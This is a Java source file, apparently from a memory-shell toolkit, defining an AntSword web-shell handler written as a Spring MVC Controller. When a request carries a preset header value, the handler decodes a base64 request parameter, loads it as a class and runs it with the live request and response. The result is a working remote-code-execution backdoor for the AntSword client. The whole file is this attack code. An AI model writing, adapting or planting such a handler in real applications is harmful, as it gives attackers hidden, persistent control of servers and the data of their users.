package com.reajason.javaweb.memshell.shelltool.antsword;

import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.mvc.Controller;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

/**
 * @author ReaJason
 * @since 2025/02/18
 */
public class AntSwordControllerHandler extends ClassLoader implements Controller {
    public static String pass;
    public static String headerName;
    public static String headerValue;

    public AntSwordControllerHandler() {
    }

    public AntSwordControllerHandler(ClassLoader c) {
        super(c);
    }

    public ModelAndView handleRequest(HttpServletRequest request, HttpServletResponse response) throws Exception {
        if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
            try {
                byte[] bytes = base64Decode(request.getParameter(pass));
                Object instance = (new AntSwordControllerHandler(Thread.currentThread().getContextClassLoader())).defineClass(bytes, 0, bytes.length).newInstance();
                instance.equals(new Object[]{request, response});
            } catch (Throwable e) {
                e.printStackTrace();
            }
        }
        return null;
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
    }
}
